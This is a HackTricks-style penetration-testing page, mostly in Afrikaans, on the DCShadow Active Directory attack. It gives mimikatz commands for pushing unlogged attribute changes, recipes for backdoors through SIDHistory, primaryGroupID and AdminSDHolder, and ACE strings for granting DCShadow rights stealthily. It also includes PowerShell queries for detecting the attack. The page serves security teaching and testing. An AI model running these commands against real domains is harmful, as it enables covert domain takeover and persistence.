# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Dit registreer 'n **new Domain Controller** in die AD en gebruik dit om **push attributes** (SIDHistory, SPNs...) op gespesifiseerde voorwerpe te plaas **without** enige **logs** oor die **modifications** te laat. Jy **need DA** voorregte en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logs sal verskyn.

Om die aanval uit te voer het jy 2 mimikatz instances nodig. Een daarvan sal die RPC servers met SYSTEM privileges begin (jy moet hier aandui watter veranderinge jy wil uitvoer), en die ander instance sal gebruik word om die waardes te push:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Let daarop dat **`elevate::token`** nie in `mimikatz1` sessie sal werk nie, omdat dit die privileges van die thread verhoog het, maar ons moet die **privilege van die process** verhoog.\
Jy kan ook 'n "LDAP" object selekteer: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge push vanaf 'n DA of vanaf 'n gebruiker met hierdie minimale toestemmings:

- In die **domein-objek**:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- Die **Sites object** (en sy children) in die **Configuration container**:
- _CreateChild and DeleteChild_
- Die objek van die **computer which is registered as a DC**:
- _WriteProperty_ (Not Write)
- Die **target object**:
- _WriteProperty_ (Not Write)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie privilegies aan 'n gebruiker sonder verhoogde regte te gee (let wel: dit sal logs nalaat). Dit is baie meer beperkend as om DA-privilegies te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die gebruikersnaam _**student1**_ wanneer aangemeld op die masjien _**mcorp-student1**_ DCShadow-permissies oor die objek _**root1user**_ het.

## DCShadow gebruik om agterdeure te skep
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Misbruik van primêre groep, leemtes in enumerasie, en opsporing

- `primaryGroupID` is 'n aparte attribuut van die groep `member`-lys. DCShadow/DSInternals kan dit direk skryf (bv. stel `primaryGroupID=512` vir **Domain Admins**) sonder on-box LSASS-handhawing, maar AD **skuif** nog steeds die gebruiker: die verandering van PGID verwyder altyd lidmaatskap van die vorige primêre groep (dieselfde gedrag vir enige teikengroep), dus kan jy nie die ou primêre-groep lidmaatskap behou nie.
- Standaardinstrumente verhinder om 'n gebruiker uit hul huidige primêre groep te verwyder (`ADUC`, `Remove-ADGroupMember`), dus vereis die verandering van PGID gewoonlik direkte directory-skryf (DCShadow/`Set-ADDBPrimaryGroup`).
- Lidmaatskapverslaggewing is inkonsekwent:
  - **Sluit in** lede wat vanaf die primêre groep afgelei is: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **Sluit uit** lede wat vanaf die primêre groep afgelei is: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
  - Rekursiewe kontroles kan primêre-groep lede mis as die **primêre groep self genestel is** (bv. gebruiker se PGID wys na 'n geneste groep binne Domain Admins); `Get-ADGroupMember -Recursive` of LDAP rekursiewe filters sal daardie gebruiker nie teruggee nie tensy rekursie eksplisiet primêre groepe oplos.
  - DACL-truuks: aanvallers kan **deny ReadProperty** op `primaryGroupID` by die gebruiker (of op die groep `member` attribuut vir nie-AdminSDHolder-groepe) gebruik om effektiewe lidmaatskap van meeste PowerShell-navrae te verberg; `net group` sal steeds die lidmaatskap oplos. AdminSDHolder-beskermde groepe sal sulke ontkennings terugstel.

Opsporing/monitering voorbeelde:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Kontroleer bevoorregte groepe deur die uitvoer van `Get-ADGroupMember` te vergelyk met `Get-ADGroup -Properties member` of ADSI Edit om afwykings wat deur die veld `primaryGroupID` of ander verborge velde veroorsaak word, op te spoor.

## Shadowception - Gee DCShadow toestemmings met DCShadow (geen logs van gewysigde toestemmings)

Ons moet die volgende ACEs byvoeg met ons gebruiker se SID aan die einde:

- Op die domeinobjek:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Op die aanvaller rekenaarobjek: `(A;;WP;;;UserSID)`
- Op die teiken gebruiker objek: `(A;;WP;;;UserSID)`
- Op die Sites-objek in die Configuration-container: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van 'n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Let daarop dat jy in hierdie geval verskeie veranderinge moet maak, nie net een nie. Dus, in die **mimikatz1 session** (RPC-server) gebruik die parameter **`/stack` met elke verandering** wat jy wil aanbring. Op hierdie manier sal jy slegs een keer hoef te **`/push`** om al die gestapelde veranderinge op die rogue server uit te voer.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
